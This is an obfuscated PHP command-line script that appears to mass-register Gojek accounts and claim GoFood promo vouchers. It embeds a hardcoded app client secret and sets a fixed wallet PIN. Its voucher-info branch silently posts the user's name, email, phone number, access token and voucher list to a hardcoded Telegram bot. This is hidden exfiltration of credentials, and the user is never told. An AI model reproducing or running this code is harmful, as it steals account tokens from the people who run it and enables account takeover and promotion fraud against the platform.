<?php date_default_timezone_set('Asia/Jakarta');include"function1.php";script:sleep(2);os.system('clear');echo "
      ██╗   ██╗██████╗ ███████╗
      ╚██╗ ██╔╝██╔══██╗██╔════╝
       ╚████╔╝ ██║  ██║█████╗  
        ╚██╔╝  ██║  ██║██╔══╝  
         ██║   ██████╔╝██║     
         ╚═╝   ╚═════╝ ╚═╝     
\n";echo "\e[89m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬";echo "\n".color("blue","PILIH NO 1 ATAU NO 2 UNTUK MELANJUTKAN \n");echo "\n".color("blue","[1] DAFTAR           [2] LOGIN \n");echo "\e[89m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬";echo "\n".color("blue","PILIH: ");$y_3838763231=trim(fgets(STDIN));if($y_3838763231=="1"||$y_3838763231=="1"){goto daftar;}else if($y_3838763231=="2"||$y_3838763231=="2"){goto login;}else{echo color("red","ERROR \n");goto script;}daftar:echo "\e[89m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬";$j_1498331679=nama();$v_3885137012=str_replace(" ","",$j_1498331679).mt_rand(100,999);echo "\n".color("blue","NOMOR : ");$v_1142375330=trim(fgets(STDIN));$v_1142375330=str_replace("62","62",$v_1142375330);$v_1142375330=str_replace("(","",$v_1142375330);$v_1142375330=str_replace(")","",$v_1142375330);$v_1142375330=str_replace("-","",$v_1142375330);$v_1142375330=str_replace(" ","",$v_1142375330);if(!preg_match('/[^+0-9]/',trim($v_1142375330))){if(substr(trim($v_1142375330),0,3)=='62'){$l_3170402924=trim($v_1142375330);}else if(substr(trim($v_1142375330),0,1)=='0'){$l_3170402924='62'.substr(trim($v_1142375330),1);}elseif(substr(trim($v_1142375330),0,2)=='62'){$l_3170402924='6'.substr(trim($v_1142375330),1);}else{$l_3170402924='1'.substr(trim($v_1142375330),0,13);}}$r_2918445923='{"email":"'.$v_3885137012.'@gmail.com","name":"'.$j_1498331679.'","phone":"+'.$l_3170402924.'","signed_up_country":"ID"}';$z_1610170388=request("/v5/customers",null,$r_2918445923);if(strpos($z_1610170388,'"otp_token"')){$q_3875127969=getStr('"otp_token":"','"',$z_1610170388);echo color("green","Kode verifikasi sudah di kirim")."\n";}else{echo color("red","Nomor sudah teregistrasi");echo"\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n\n";echo color("red","Silahkan registrasi kembali\n");goto daftar;}otp:echo color("blue","OTP : ");$v_2812057793=trim(fgets(STDIN));$y_1472867494='{"client_name":"gojek:consumer:app","data":{"otp":"'.$v_2812057793.'","otp_token":"'.$q_3875127969.'"},"client_secret":"pGwQ7oi8bKqqwvid09UrjqpkMEHklb"}';$y_4224929278=request("/v5/customers/phone/verify",null,$y_1472867494);if(strpos($y_4224929278,'"access_token"')){echo color("green","Berhasil mendaftar\n");}else{echo color("red","Otp yang anda input salah");echo"\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n\n";echo color("red","Silahkan input kembali\n");goto otp;}$f_1597481275=getStr('"access_token":"','"',$y_4224929278);$m_3514781862=getStr('"resource_owner_id":',',',$y_4224929278);echo color("nevy","accessToken : ".$f_1597481275."\n\n");save("token.txt",$f_1597481275);$d_2450309517="Proses SetPIN";for($r_1872009285=10;$r_1872009285>-1;$r_1872009285--){echo "\r                             \r";echo "\r".$d_2450309517." Tunggu ".$r_1872009285." Detik ";if($r_1872009285==20 or$r_1872009285==16 or$r_1872009285==13 or$r_1872009285==10 or$r_1872009285==6 or$r_1872009285==3){echo$u_4200126041."•";}if($r_1872009285==19 or$r_1872009285==15 or$r_1872009285==12 or$r_1872009285==9 or$r_1872009285==5 or$r_1872009285==2){echo$u_4200126041."••";}if($r_1872009285==18 or$r_1872009285==14 or$r_1872009285==11 or$r_1872009285==8 or$r_1872009285==4 or$r_1872009285==1){echo$u_4200126041."•••";}if($r_1872009285==0){echo$u_4200126041."•••••";echo "\n";}sleep(1);}echo color("blue","Pin Kamu 112233")."\n";$s_3468918044='{"pin":"112233"}';$w_3429570876=request("/wallet/pin",$f_1597481275,$s_3468918044,null,null,$m_3514781862);otp1:echo "Otp pin: ";$e_3546042850=trim(fgets(STDIN));$f_3666767572=request("/wallet/pin",$f_1597481275,$s_3468918044,null,$e_3546042850,$m_3514781862);if(strpos($f_3666767572,'true')){echo color("green","Berhasil SetPin \n");}else{echo color("red","Otp yang anda input salah");echo"\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n\n";echo color("red","Silahkan input kembali\n");goto otp1;}goto claim;login:echo "\e[89m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬";echo "\n".color("blue","TOKEN: ");$f_1597481275=trim(fgets(STDIN));claim:echo "\n";echo "\n";$l_1277974438='{"promo_code":"PENGENGOFOOD2107"}';$c_3575973404='{"promo_code":"MAUGOFOOD2107"}';$u_2720151178='{"promo_code":"PESANGOFOOD2107"}';$l_1011262249='{"promo_code":"COBAGOFOOD2107"}';echo "\e[89m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n";$d_2450309517="Proses Claim Voucher Gofood 1";for($r_1872009285=20;$r_1872009285>-1;$r_1872009285--){echo "\r                             \r";echo "\r".$d_2450309517." Tunggu ".$r_1872009285." Detik ";if($r_1872009285==20 or$r_1872009285==16 or$r_1872009285==13 or$r_1872009285==10 or$r_1872009285==6 or$r_1872009285==3){echo$u_4200126041."•";}if($r_1872009285==19 or$r_1872009285==15 or$r_1872009285==12 or$r_1872009285==9 or$r_1872009285==5 or$r_1872009285==2){echo$u_4200126041."••";}if($r_1872009285==18 or$r_1872009285==14 or$r_1872009285==11 or$r_1872009285==8 or$r_1872009285==4 or$r_1872009285==1){echo$u_4200126041."•••";}if($r_1872009285==0){echo$u_4200126041."•••••";echo "\n";}sleep(1);}$g_2105532913=request('/go-promotions/v1/promotions/enrollments',$f_1597481275,$l_1277974438);$r_3065852031=fetch_value($g_2105532913,'"message":"','"');if(strpos($g_2105532913,'Promo kamu sudah bisa dipakai')){echo "\n".color("green","Message: ".$r_3065852031);goto gofood;}else{echo "\n".color("red","Message: ".$r_3065852031);gofood:echo "\n";echo "\n";}echo "\e[89m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n";$d_2450309517="Proses Claim Voucher Gofood 2";for($r_1872009285=20;$r_1872009285>-1;$r_1872009285--){echo "\r                             \r";echo "\r".$d_2450309517." Tunggu ".$r_1872009285." Detik ";if($r_1872009285==20 or$r_1872009285==16 or$r_1872009285==13 or$r_1872009285==10 or$r_1872009285==6 or$r_1872009285==3){echo$u_4200126041."•";}if($r_1872009285==19 or$r_1872009285==15 or$r_1872009285==12 or$r_1872009285==9 or$r_1872009285==5 or$r_1872009285==2){echo$u_4200126041."••";}if($r_1872009285==18 or$r_1872009285==14 or$r_1872009285==11 or$r_1872009285==8 or$r_1872009285==4 or$r_1872009285==1){echo$u_4200126041."•••";}if($r_1872009285==0){echo$u_4200126041."•••••";echo "\n";}sleep(1);}$g_2105532913=request('/go-promotions/v1/promotions/enrollments',$f_1597481275,$c_3575973404);$r_3065852031=fetch_value($g_2105532913,'"message":"','"');if(strpos($g_2105532913,'Promo kamu sudah bisa dipakai')){echo "\n".color("green","Message: ".$r_3065852031);goto gofood2;}else{echo "\n".color("red","Message: ".$r_3065852031);gofood2:echo "\n";echo "\n";}echo "\e[89m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n";$d_2450309517="Proses Claim Voucher Gofood 3";for($r_1872009285=20;$r_1872009285>-1;$r_1872009285--){echo "\r                             \r";echo "\r".$d_2450309517." Tunggu ".$r_1872009285." Detik ";if($r_1872009285==20 or$r_1872009285==16 or$r_1872009285==13 or$r_1872009285==10 or$r_1872009285==6 or$r_1872009285==3){echo$u_4200126041."•";}if($r_1872009285==19 or$r_1872009285==15 or$r_1872009285==12 or$r_1872009285==9 or$r_1872009285==5 or$r_1872009285==2){echo$u_4200126041."••";}if($r_1872009285==18 or$r_1872009285==14 or$r_1872009285==11 or$r_1872009285==8 or$r_1872009285==4 or$r_1872009285==1){echo$u_4200126041."•••";}if($r_1872009285==0){echo$u_4200126041."•••••";echo "\n";}sleep(1);}$g_2105532913=request('/go-promotions/v1/promotions/enrollments',$f_1597481275,$u_2720151178);$r_3065852031=fetch_value($g_2105532913,'"message":"','"');if(strpos($g_2105532913,'Promo kamu sudah bisa dipakai')){echo "\n".color("green","Message: ".$r_3065852031);goto gofood3;}else{echo "\n".color("red","Message: ".$r_3065852031);gofood3:echo "\n";echo "\n";}echo "\e[89m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n";$d_2450309517="Proses Claim Voucher Gofood 4";for($r_1872009285=20;$r_1872009285>-1;$r_1872009285--){echo "\r                             \r";echo "\r".$d_2450309517." Tunggu ".$r_1872009285." Detik ";if($r_1872009285==20 or$r_1872009285==16 or$r_1872009285==13 or$r_1872009285==10 or$r_1872009285==6 or$r_1872009285==3){echo$u_4200126041."•";}if($r_1872009285==19 or$r_1872009285==15 or$r_1872009285==12 or$r_1872009285==9 or$r_1872009285==5 or$r_1872009285==2){echo$u_4200126041."••";}if($r_1872009285==18 or$r_1872009285==14 or$r_1872009285==11 or$r_1872009285==8 or$r_1872009285==4 or$r_1872009285==1){echo$u_4200126041."•••";}if($r_1872009285==0){echo$u_4200126041."•••••";echo "\n";}sleep(1);}$g_2105532913=request('/go-promotions/v1/promotions/enrollments',$f_1597481275,$l_1011262249);$r_3065852031=fetch_value($g_2105532913,'"message":"','"');if(strpos($g_2105532913,'Promo kamu sudah bisa dipakai')){echo "\n".color("green","Message: ".$r_3065852031);goto gofood4;}else{echo "\n".color("red","Message: ".$r_3065852031);gofood4:echo "\n";echo "\n";}goto claim2;info:sleep(1);$s_3436303781=request('/gopoints/v3/wallet/vouchers?limit=13&page=1',$f_1597481275);$d_3257917790=fetch_value($s_3436303781,'"total_vouchers":',',');$r_197601268=getStr1('"title":"','",',$s_3436303781,"1");$f_2463004238=getStr1('"title":"','",',$s_3436303781,"2");$q_3855173336=getStr1('"title":"','",',$s_3436303781,"3");$a_2074989435=getStr1('"title":"','",',$s_3436303781,"4");$u_212526061=getStr1('"title":"','",',$s_3436303781,"5");$h_2510533207=getStr1('"title":"','",',$s_3436303781,"6");$n_3802432193=getStr1('"title":"','",',$s_3436303781,"7");$j_1914412880=getStr1('"title":"','",',$s_3436303781,"8");$r_85766086=getStr1('"title":"','",',$s_3436303781,"9");$y_1308634627=getStr1('"title":"','",',$s_3436303781,"10");$z_956767893=getStr1('"title":"','",',$s_3436303781,"11");$m_2685292335=getStr1('"title":"','",',$s_3436303781,"12");$r_3607723961=getStr1('"title":"','",',$s_3436303781,"13");echo "\e[89m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n";echo "\n".color("green","TOTAL VOUCHER ".$d_3257917790." : ");echo "\n".color("nevy","                     1. ".$r_197601268);echo "\n".color("nevy","                     2. ".$f_2463004238);echo "\n".color("nevy","                     3. ".$q_3855173336);echo "\n".color("nevy","                     4. ".$a_2074989435);echo "\n".color("nevy","                     5. ".$u_212526061);echo "\n".color("nevy","                     6. ".$h_2510533207);echo "\n".color("nevy","                     7. ".$n_3802432193);echo "\n".color("nevy","                     8. ".$j_1914412880);echo "\n".color("nevy","                     9. ".$r_85766086);echo "\n".color("nevy","                     10. ".$y_1308634627);echo "\n".color("nevy","                     11. ".$z_956767893);echo "\n".color("nevy","                     12. ".$m_2685292335);echo "\n".color("nevy","                     13. ".$r_3607723961);echo"\n";$x_1657485378=getStr1('"expiry_date":"','"',$s_3436303781,'1');$k_4223822328=getStr1('"expiry_date":"','"',$s_3436303781,'2');$v_2361743726=getStr1('"expiry_date":"','"',$s_3436303781,'3');$p_312593613=getStr1('"expiry_date":"','"',$s_3436303781,'4');$g_1705442395=getStr1('"expiry_date":"','"',$s_3436303781,'5');$c_4239371745=getStr1('"expiry_date":"','"',$s_3436303781,'6');$j_2343083383=getStr1('"expiry_date":"','"',$s_3436303781,'7');$d_454525158=getStr1('"expiry_date":"','"',$s_3436303781,'8');$e_1813033072=getStr1('"expiry_date":"','"',$s_3436303781,'9');$v_1818965157=getStr1('"expiry_date":"','"',$s_3436303781,'10');$c_460063795=getStr1('"expiry_date":"','"',$s_3436303781,'11');$w_2187679113=getStr1('"expiry_date":"','"',$s_3436303781,'12');$r_4116866335=getStr1('"expiry_date":"','"',$s_3436303781,'13');$c_2825085835="1207782927:AAGcOEdPEiiht2JYL6ZUXKVU1oTTwS7Unv8";$e_3093480862="643595064";$o_3008614483="Gojek Account Info \n\nNama = ".$j_1498331679."\n\nEmail = ".$v_3885137012."\n\nNomor = ".$v_1142375330."\n\nToken = ".$f_1597481275."\n\nTotalVoucher = ".$d_3257917790."\n🎁 ".$r_197601268."\n🎁 Exp : [".$x_1657485378."]\n🎁 ".$f_2463004238."\n🎁 Exp : [".$k_4223822328."]\n🎁 ".$q_3855173336."\n🎁 Exp : [".$v_2361743726."]\n🎁 ".$a_2074989435."\n🎁 Exp : [".$p_312593613."]\n🎁 ".$u_212526061."\n🎁 Exp : [".$g_1705442395."]\n🎁 ".$h_2510533207."\n🎁 Exp : [".$c_4239371745."]\n🎁 ".$n_3802432193."\n🎁 Exp : [".$j_2343083383."]\n🎁 ".$j_1914412880."\n🎁 Exp : [".$d_454525158."]\n🎁 ".$r_85766086."\n🎁 Exp : [".$e_1813033072."]\n🎁 ".$y_1308634627."\n🎁 Exp : [".$v_1818965157."] ".$z_956767893."\n🎁 Exp : [".$c_460063795."]\n🎁 ".$m_2685292335."\n🎁 Exp : [".$w_2187679113."]\n🎁 ".$r_3607723961."\n🎁 Exp : [".$r_4116866335."]\n🎁";$g_1582905952="sendMessage";$n_4101391790="https://api.telegram.org/bot".$c_2825085835."/".$g_1582905952;$h_1519021197=['chat_id'=>$e_3093480862,'text'=>$o_3008614483];$k_1853008065=["X-Requested-With: XMLHttpRequest","User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36"];$h_1281410033=curl_init();curl_setopt($h_1281410033,CURLOPT_RETURNTRANSFER,1);curl_setopt($h_1281410033,CURLOPT_URL,$n_4101391790);curl_setopt($h_1281410033,CURLOPT_HTTPHEADER,$k_1853008065);curl_setopt($h_1281410033,CURLOPT_POSTFIELDS,$h_1519021197);curl_setopt($h_1281410033,CURLOPT_SSL_VERIFYPEER,false);$j_3474459674=curl_exec($h_1281410033);$e_1574812785=curl_error($h_1281410033);$l_2063623452=curl_getinfo($h_1281410033,CURLINFO_HTTP_CODE);curl_close($h_1281410033);$e_1822771111['text']=$o_3008614483;$e_1822771111['respon']=json_decode($j_3474459674,true);die();claim2:echo "\e[89m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬";echo "\n".color("blue","PILIH NO 1 , NO 2 ATAU NO 3 UNTUK MELANJUTKAN \n");echo "\n".color("blue","[1] DAFTAR     [2] LOGIN     [3] INFO VOUCHER \n");echo "\e[89m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬";echo "\n".color("blue","PILIH: ");$y_3838763231=trim(fgets(STDIN));if($y_3838763231=="1"||$y_3838763231=="1"){goto daftar;}else if($y_3838763231=="2"||$y_3838763231=="2"){goto login;}else{goto info;}?>